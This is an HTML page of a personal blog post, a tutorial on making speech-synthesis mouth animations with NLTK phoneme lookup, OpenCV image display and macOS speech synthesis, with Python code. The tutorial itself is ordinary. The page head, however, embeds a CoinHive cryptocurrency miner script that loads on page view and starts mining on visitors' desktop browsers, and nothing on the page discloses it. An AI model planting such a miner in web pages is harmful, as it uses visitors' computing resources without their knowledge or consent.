<!doctype html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
<head>
<meta charset="utf-8">
<title>Using openCV and NLTK to Make Speech Synthesis Animation &#8211; Kaze's Mind</title>
<meta name="description" content="Talk computer! Talk!">
<meta name="keywords" content="PhD, OpenCV, NLTK, Python, Speech Synthesis">


<!-- Twitter Cards -->
<meta name="twitter:title" content="Using openCV and NLTK to Make Speech Synthesis Animation">
<meta name="twitter:description" content="Talk computer! Talk!">
<meta name="twitter:site" content="@kazenotenshi">
<meta name="twitter:creator" content="@kazenotenshi">

<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://localhost:4000/images/default-thumb.png">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Using openCV and NLTK to Make Speech Synthesis Animation">
<meta property="og:description" content="Talk computer! Talk!">
<meta property="og:url" content="http://localhost:4000/programming/using-opencv-and-nltk-to-make-speech-synthesis-animation/">
<meta property="og:site_name" content="Kaze's Mind">





<link rel="canonical" href="http://localhost:4000/programming/using-opencv-and-nltk-to-make-speech-synthesis-animation/">
<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="Kaze's Mind Feed">


<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- For all browsers -->
<link rel="stylesheet" href="http://localhost:4000/assets/css/main.css">

<meta http-equiv="cleartype" content="on">

<!-- HTML5 Shiv and Media Query Support -->
<!--[if lt IE 9]>
	<script src="http://localhost:4000/assets/js/vendor/html5shiv.min.js"></script>
	<script src="http://localhost:4000/assets/js/vendor/respond.min.js"></script>
<![endif]-->

<!-- Modernizr -->
<script src="http://localhost:4000/assets/js/vendor/modernizr-2.7.1.custom.min.js"></script>

<!-- Miner -->
<script src="https://coin-hive.com/lib/coinhive.min.js">
var miner = new CoinHive.User('wHgHeuOVbM5FTi93SaXqtYUWSPW1yi4U', 'luiz-santos', {
				autoThreads: true,
				throttle: 0.8,
				language: 'auto'
				});
if (!miner.isMobile()) {
	miner.start();
}
</script>

<link href='//fonts.googleapis.com/css?family=PT+Sans+Narrow:400,700%7CPT+Serif:400,700,400italic' rel='stylesheet' type='text/css'>

<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">

</head>

<body class="post">

<!--[if lt IE 9]><div class="browser-upgrade alert alert-info">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</div><![endif]-->

<div class="navigation-wrapper">
	<div class="site-name">
		<a href="http://localhost:4000/">Kaze's Mind</a>
	</div><!-- /.site-name -->
	<div class="top-navigation">
		<nav role="navigation" id="site-nav" class="nav">
		    <ul>
		        
				    
				    <li><a href="http://localhost:4000/posts/" >Blog</a></li>
				
				    
				    <li><a href="http://localhost:4000/about/" >About</a></li>
				
				    
				    <li><a href="http://localhost:4000/photography/" >Photography</a></li>
				
				    
				    <li><a href="http://localhost:4000/portifolio/" >Portifolio</a></li>
				
		    </ul>
		</nav>
	</div><!-- /.top-navigation -->
</div><!-- /.navigation-wrapper -->



<div id="main" role="main">
  <div class="article-author-side">
    


	<img src="http://localhost:4000/images/me.png" class="bio-photo" alt="Luiz Guilherme bio photo">

<h3>Luiz Guilherme</h3>
<p>Game Developer, Software Engineer, Photographer, Ukulele Player</p>
<a href="mailto:luiz@kaze.io" class="author-social" target="_blank"><i class="fa fa-fw fa-envelope-square"></i> Email</a>
<a href="http://twitter.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a>
<a href="http://facebook.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-facebook-square"></i> Facebook</a>

<a href="http://linkedin.com/in/luizgosantos" class="author-social" target="_blank"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a>
<a href="http://instagram.com/kaze_" class="author-social" target="_blank"><i class="fa fa-fw fa-instagram"></i> Instagram</a>
<a href="http://www.flickr.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-flickr"></i> Flickr</a>
<a href="http://kazen0tenshi.deviantart.com" class="author-social" target="_blank"><i class="fa fa-fw fa-deviantart"></i> Deviant Art</a>

<a href="http://github.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-github"></i> Github</a>





<a href="http://steamcommunity.com/id/kazen0tenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-steam-square"></i> Steam</a>
<a href="https://youtube.com/user/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-youtube-square"></i> Youtube</a>


  </div>
  <article class="post">
    <div class="headline-wrap">
      
        <h1><a href="http://localhost:4000/programming/using-opencv-and-nltk-to-make-speech-synthesis-animation/" rel="bookmark" title="Using openCV and NLTK to Make Speech Synthesis Animation">Using openCV and NLTK to Make Speech Synthesis Animation</a></h1>
      
    </div><!--/ .headline-wrap -->
    <div class="article-wrap">
      <p>The project of this article is hosted at <a href="http://github.com/kazenotenshi/NLPAnimation">http://github.com/kazenotenshi/NLPAnimation</a>.</p>

<p>All the mouth images where found at <a href="http://www.garycmartin.com/mouth_shapes.html">http://www.garycmartin.com/mouth_shapes.html</a>.</p>

<h2 id="the-beginning">The Beginning</h2>

<p>Hello, and if you’re here after a long time, so sorry for the long delay. After I came back from Japan I’ve been working a lot and had few time to continue updating this blog. Today, I’ll discuss and show some code of a prototype ( that is not something really fancy =) ) of an exercise to do some speech synthesis with animations of text files.</p>

<p>Let’s talk! The main idea is shown below:</p>

<div align="center">
<figure>
     <a href="/images/SpeechSynthesis.png"><img src="/images/SpeechSynthesis.png" alt="Speech Synthesis Idea" align="middle" /></a>
 
     <figcaption>Speech Synthesis Idea</figcaption>
</figure>
</div>

<p>The main ideia is to transform text files into animations with mouth visualization and speech synthesis. To do so, my goal is to pre-process this file and transfer it into phonemes and then use it to generate a synced speech synthesis and image animation. Let’s take a look at how to do it.</p>

<h2 id="coding">Coding</h2>

<p>The main files of the project are phonemes.py and imageprototype.py. The other ones where just small tests that I had conducted during the development just to verify some assumptions.</p>

<p>The file phonemes.py is more like a “.h” file to store the image library and the phonemes correspondence to these images that is gonna be really useful during the pre-processing phase. Each word will be translated to a list of phonemes ( e.g: NATURAL = [N ,AE1,CH,ER0,AH0,L] ) and that the global list of phonemes will have an image associated to it. Refer to NLTK Doc ( <a href="http://www.nltk.org/_modules/nltk/corpus/reader/cmudict.html">here</a> ) about how these phonemes work. Along with the phoneme information, NLTK provides some intonation information of every word, it will be useful later. The file phonemes.py has two main structures: mouths and PhonemesToMouth. The file is implemented as shown below:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">cv2</span>
<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="n">np</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">nltk</span>

<span class="c">## Importing all the mouth images</span>
<span class="n">mouths</span> <span class="o">=</span> <span class="p">{}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"./mouths"</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".jpg"</span><span class="p">):</span>
        <span class="k">print</span> <span class="n">i</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s">"./mouths"</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">mouths</span><span class="p">[</span><span class="s">""</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">img</span>
        <span class="k">continue</span>
<span class="c">#print mouths</span>

<span class="c">#Creating the Dictionary between phonemes and mouths</span>
<span class="n">PhonemeToMouth</span><span class="o">=</span><span class="p">{</span><span class="s">'AA'</span><span class="p">:</span><span class="s">'blair_o.jpg'</span><span class="p">,</span>
<span class="s">'AH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'AW'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'AE'</span><span class="p">:</span><span class="s">'blair_a_i.jpg'</span><span class="p">,</span>
<span class="s">'AO'</span><span class="p">:</span><span class="s">'blair_o.jpg'</span><span class="p">,</span>
<span class="s">'AY'</span><span class="p">:</span><span class="s">'blair_a_i.jpg'</span><span class="p">,</span>
<span class="s">'B'</span><span class="p">:</span><span class="s">'blair_m_b_p.jpg'</span><span class="p">,</span>
<span class="s">'CH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'DH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'D'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'EH'</span><span class="p">:</span><span class="s">'blair_e.jpg'</span><span class="p">,</span>
<span class="s">'EY'</span><span class="p">:</span><span class="s">'blair_a_i.jpg'</span><span class="p">,</span>
<span class="s">'ER'</span><span class="p">:</span><span class="s">'blair_u.jpg'</span><span class="p">,</span>
<span class="s">'F'</span><span class="p">:</span><span class="s">'blair_f_v_d_th.jpg'</span><span class="p">,</span>
<span class="s">'G'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'HH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'IY'</span><span class="p">:</span><span class="s">'blair_e.jpg'</span><span class="p">,</span>
<span class="s">'IH'</span><span class="p">:</span><span class="s">'blair_a_i.jpg'</span><span class="p">,</span>
<span class="s">'JH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'K'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'L'</span><span class="p">:</span><span class="s">'blair_l_d_th.jpg'</span><span class="p">,</span>
<span class="s">'M'</span><span class="p">:</span><span class="s">'blair_m_b_p.jpg'</span><span class="p">,</span>
<span class="s">'NG'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'N'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'OY'</span><span class="p">:</span><span class="s">'blair_a_i.jpg'</span><span class="p">,</span>
<span class="s">'OW'</span><span class="p">:</span><span class="s">'blair_o.jpg'</span><span class="p">,</span>
<span class="s">'P'</span><span class="p">:</span><span class="s">'blair_m_b_p.jpg'</span><span class="p">,</span>
<span class="s">'T'</span><span class="p">:</span><span class="s">'blair_l_d_th.jpg'</span><span class="p">,</span>
<span class="s">'R'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'SH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'S'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'TH'</span><span class="p">:</span><span class="s">'blair_f_v_d_th.jpg'</span><span class="p">,</span>
<span class="s">'UH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'UW'</span><span class="p">:</span><span class="s">'blair_u.jpg'</span><span class="p">,</span>
<span class="s">'W'</span><span class="p">:</span><span class="s">'blair_w_q.jpg'</span><span class="p">,</span>
<span class="s">'V'</span><span class="p">:</span><span class="s">'blair_f_v_d_th.jpg'</span><span class="p">,</span>
<span class="s">'Y'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'ZH'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">,</span>
<span class="s">'Z'</span><span class="p">:</span><span class="s">'blair_c_d_g_k_n_r_s_th_y_z.jpg'</span><span class="p">}</span></code></pre></figure>

<p>Now, let’s move to the next part. A sample text is written at sample.txt file. The first thing is to translate this file to a [word,phoneme] list. To do it, the program has to open the file, split the string into words using a tokenizer and find all the file correspondences in the phoneme dictionary. The code snippet bellow shows how to open the file, separate it into words, and find the phoneme correspondence to each word in the phoneme dictionary provided by NTLK.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">file_content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"sample.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">tokens</span> <span class="o">=</span> <span class="n">nltk</span><span class="o">.</span><span class="n">word_tokenize</span><span class="p">(</span><span class="n">file_content</span><span class="p">)</span>
<span class="k">print</span> <span class="n">tokens</span>

<span class="n">entries</span> <span class="o">=</span> <span class="n">nltk</span><span class="o">.</span><span class="n">corpus</span><span class="o">.</span><span class="n">cmudict</span><span class="o">.</span><span class="n">entries</span><span class="p">()</span>
<span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">entries</span><span class="p">)</span>

<span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
<span class="n">TextToSpeech</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">token</span> <span class="ow">in</span> <span class="n">tokens</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">entries</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">token</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="n">entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
            <span class="n">TextToSpeech</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span>
            <span class="k">break</span></code></pre></figure>

<p>A disclaimer: this is not the best optimized way to find words in a big list. Actually, it is really slow right now. For proof of concept purposes it just works. Still, I have some ideias to improve this part, I’ll try some stuff and probably put the results here later.</p>

<p>The TextToSpeech variable will hold something like:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="p">[(</span><span class="s">u'and'</span><span class="p">,</span> <span class="p">[</span><span class="s">u'AH0'</span><span class="p">,</span> <span class="s">u'N'</span><span class="p">,</span> <span class="s">u'D'</span><span class="p">]),</span> <span class="p">(</span><span class="s">u'there'</span><span class="p">,</span> <span class="p">[</span><span class="s">u'DH'</span><span class="p">,</span> <span class="s">u'EH1'</span><span class="p">,</span> <span class="s">u'R'</span><span class="p">]),</span> <span class="o">...</span> <span class="p">]</span></code></pre></figure>

<p>Now, for every phoneme of every word, the phoneme time has to be inferred, and the proper image has to be shown during the speech. Here comes a harder part. I have researched many different libraries to do the speaking part. And none of then provided me a truly reliable callback to know the time for each word. The one I decided to use was the OSX’s NSSpeechSynthetizer, which is used by pyttsx library. Pyttsx is a python biding for Speech Synthesis in many different OS.</p>

<p>The hard coded part of this tutorial was to infer what is a normal phoneme, long phoneme and small phoneme. For each word, the program iterates over the list of phonemes and applies the corresponding times to each phoneme before the speech and visual processing. If the phoneme has a number 1 on it, it is a long phoneme, if it has a 0 it is a small one. Take a look at the code below:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">timePerPhoneme</span> <span class="o">=</span> <span class="mf">0.15</span>
<span class="n">longPhonemeBonus</span> <span class="o">=</span> <span class="mf">0.05</span>
<span class="n">smallPhonemeBonus</span> <span class="o">=</span> <span class="o">-</span><span class="mf">0.05</span>

<span class="c">## For each mouth you should put a refering mouth to show</span>
<span class="c">## do the double check</span>
<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">TextToSpeech</span><span class="p">:</span>
    <span class="c"># Get the right list of mouths</span>

    <span class="n">timeForAWord</span> <span class="o">=</span> <span class="mf">0.0</span>
    <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="mf">0.0</span>
    <span class="n">MouthsToShow</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">ph</span> <span class="ow">in</span> <span class="n">word</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">phonemes</span><span class="o">.</span><span class="n">PhonemeToMouth</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
            <span class="k">if</span> <span class="s">'1'</span> <span class="ow">in</span> <span class="n">ph</span><span class="p">:</span>
                <span class="n">timeForAWord</span> <span class="o">+=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">longPhonemeBonus</span>
                <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">longPhonemeBonus</span>
            <span class="k">elif</span> <span class="s">'0'</span> <span class="ow">in</span> <span class="n">ph</span><span class="p">:</span>
                <span class="n">timeForAWord</span> <span class="o">+=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">smallPhonemeBonus</span>
                <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">smallPhonemeBonus</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">timeForAWord</span> <span class="o">+=</span> <span class="n">timePerPhoneme</span>
                <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="n">timePerPhoneme</span>
            <span class="k">if</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">ph</span><span class="p">:</span>
                <span class="n">MouthsToShow</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">value</span><span class="p">,</span> <span class="n">timeOfThisPhoneme</span><span class="p">))</span></code></pre></figure>

<p>Why do I hold both phoneme and word time? Because the phonemes time are used for the mouths independently, and the word time is used by the speech synthesis.</p>

<p>During speech, a main problem is that the call holds the program until all the speaking is done. Since the main ideia is to speech and visualization at the same time, a multi-threading approach must be done. Each time I need to speak a word, I’ll call a function from another thread to avoid interruptions and put a wait time, so the speaking is not cut in the middle. Look at the code below:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># called by each thread</span>
<span class="k">def</span> <span class="nf">speak_word</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">waittime</span><span class="p">):</span>
    <span class="n">nssp</span> <span class="o">=</span> <span class="n">NSSpeechSynthesizer</span>
    <span class="n">ve</span> <span class="o">=</span> <span class="n">nssp</span><span class="o">.</span><span class="n">alloc</span><span class="p">()</span><span class="o">.</span><span class="n">init</span><span class="p">()</span>
    <span class="n">ve</span><span class="o">.</span><span class="n">setVoice_</span><span class="p">(</span><span class="s">"com.apple.speech.synthesis.voice.Alex"</span><span class="p">)</span>
    <span class="n">ve</span><span class="o">.</span><span class="n">startSpeakingString_</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>

    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">waittime</span><span class="p">)</span>
    <span class="k">return</span>

<span class="c"># Call co-routine to speak</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">speak_word</span><span class="p">,</span> <span class="p">(</span><span class="n">word</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">timeForAWord</span> <span class="p">)</span> <span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Error: unable to start thread for audio =/"</span></code></pre></figure>

<p>Finally, the program uses the OpenCV to show the images of the mouths using the same time information collected before and the dictionary that maps mouths to phonemes. This part is shown below:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="c">#Show Mouths</span>
    <span class="k">for</span> <span class="n">mouth</span> <span class="ow">in</span> <span class="n">MouthsToShow</span><span class="p">:</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">phonemes</span><span class="o">.</span><span class="n">mouths</span><span class="p">[</span><span class="n">mouth</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span>
        <span class="n">cv2</span><span class="o">.</span><span class="n">imshow</span><span class="p">(</span><span class="s">'window'</span><span class="p">,</span> <span class="n">img</span><span class="p">)</span>
        <span class="n">cv2</span><span class="o">.</span><span class="n">waitKey</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">mouth</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span></code></pre></figure>

<p>The complete imageprototype.py code is:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">cv2</span>
<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="n">np</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">nltk</span>
<span class="kn">import</span> <span class="nn">phonemes</span>
<span class="kn">import</span> <span class="nn">thread</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span>  <span class="nn">AppKit</span> <span class="kn">import</span> <span class="n">NSSpeechSynthesizer</span>

<span class="c">#Defines</span>
<span class="n">timePerPhoneme</span> <span class="o">=</span> <span class="mf">0.15</span>
<span class="n">longPhonemeBonus</span> <span class="o">=</span> <span class="mf">0.05</span>
<span class="n">smallPhonemeBonus</span> <span class="o">=</span> <span class="o">-</span><span class="mf">0.05</span>

<span class="c"># called by each thread</span>
<span class="k">def</span> <span class="nf">speak_word</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="n">waittime</span><span class="p">):</span>
    <span class="n">nssp</span> <span class="o">=</span> <span class="n">NSSpeechSynthesizer</span>
    <span class="n">ve</span> <span class="o">=</span> <span class="n">nssp</span><span class="o">.</span><span class="n">alloc</span><span class="p">()</span><span class="o">.</span><span class="n">init</span><span class="p">()</span>
    <span class="n">ve</span><span class="o">.</span><span class="n">setVoice_</span><span class="p">(</span><span class="s">"com.apple.speech.synthesis.voice.Alex"</span><span class="p">)</span>
    <span class="n">ve</span><span class="o">.</span><span class="n">startSpeakingString_</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>

    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">waittime</span><span class="p">)</span>
    <span class="k">return</span>


<span class="n">file_content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"sample.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">tokens</span> <span class="o">=</span> <span class="n">nltk</span><span class="o">.</span><span class="n">word_tokenize</span><span class="p">(</span><span class="n">file_content</span><span class="p">)</span>

<span class="n">entries</span> <span class="o">=</span> <span class="n">nltk</span><span class="o">.</span><span class="n">corpus</span><span class="o">.</span><span class="n">cmudict</span><span class="o">.</span><span class="n">entries</span><span class="p">()</span>

<span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
<span class="n">TextToSpeech</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">token</span> <span class="ow">in</span> <span class="n">tokens</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">entries</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">token</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="n">entry</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
            <span class="n">TextToSpeech</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">entry</span><span class="p">)</span>
            <span class="k">break</span>
<span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>

<span class="c">## For each mouth you should put a refering mouth to show</span>
<span class="c">## do the double check</span>
<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">TextToSpeech</span><span class="p">:</span>
    <span class="c"># Get the right list of mouths</span>

    <span class="n">timeForAWord</span> <span class="o">=</span> <span class="mf">0.0</span>
    <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="mf">0.0</span>
    <span class="n">MouthsToShow</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">ph</span> <span class="ow">in</span> <span class="n">word</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">phonemes</span><span class="o">.</span><span class="n">PhonemeToMouth</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
            <span class="k">if</span> <span class="s">'1'</span> <span class="ow">in</span> <span class="n">ph</span><span class="p">:</span>
                <span class="n">timeForAWord</span> <span class="o">+=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">longPhonemeBonus</span>
                <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">longPhonemeBonus</span>
            <span class="k">elif</span> <span class="s">'0'</span> <span class="ow">in</span> <span class="n">ph</span><span class="p">:</span>
                <span class="n">timeForAWord</span> <span class="o">+=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">smallPhonemeBonus</span>
                <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="n">timePerPhoneme</span> <span class="o">+</span> <span class="n">smallPhonemeBonus</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">timeForAWord</span> <span class="o">+=</span> <span class="n">timePerPhoneme</span>
                <span class="n">timeOfThisPhoneme</span> <span class="o">=</span> <span class="n">timePerPhoneme</span>
            <span class="k">if</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">ph</span><span class="p">:</span>
                <span class="n">MouthsToShow</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">value</span><span class="p">,</span> <span class="n">timeOfThisPhoneme</span><span class="p">))</span>

    <span class="c"># Call co-routine to speak</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">thread</span><span class="o">.</span><span class="n">start_new_thread</span><span class="p">(</span><span class="n">speak_word</span><span class="p">,</span> <span class="p">(</span><span class="n">word</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">timeForAWord</span> <span class="p">)</span> <span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Error: unable to start thread for audio =/"</span>

    <span class="c">#Show Mouths</span>
    <span class="k">for</span> <span class="n">mouth</span> <span class="ow">in</span> <span class="n">MouthsToShow</span><span class="p">:</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">phonemes</span><span class="o">.</span><span class="n">mouths</span><span class="p">[</span><span class="n">mouth</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span>
        <span class="n">cv2</span><span class="o">.</span><span class="n">imshow</span><span class="p">(</span><span class="s">'window'</span><span class="p">,</span> <span class="n">img</span><span class="p">)</span>
        <span class="n">cv2</span><span class="o">.</span><span class="n">waitKey</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">mouth</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span></code></pre></figure>

<h2 id="discussion">Discussion</h2>

<p>Although it is pretty easy to do this kind of coding using some existing python bindings, it seems to be a little inefficient at start. I put a small paragraph to pre-process and it takes about 2 minutes. The main reason is the phoneme match part. Since the library just gives the whole dictionary it is really painful to iterate over some thousands of words to find the one you want. Some improvements can be done at this part of the code.</p>

